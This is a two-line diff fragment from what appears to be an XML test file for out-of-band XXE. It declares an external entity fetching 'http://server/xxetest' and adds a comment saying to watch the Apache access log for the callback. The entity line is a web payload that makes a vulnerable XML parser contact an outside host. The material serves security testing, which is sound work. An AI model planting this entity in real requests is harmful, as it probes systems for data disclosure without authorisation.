@@ -1,1 +1,2 @@
 <!ENTITY xxe SYSTEM "http://server/xxetest">]>
+<!-- View your Apache logs (command is sudo tail -f /var/log/apache2/access.log ) --> 
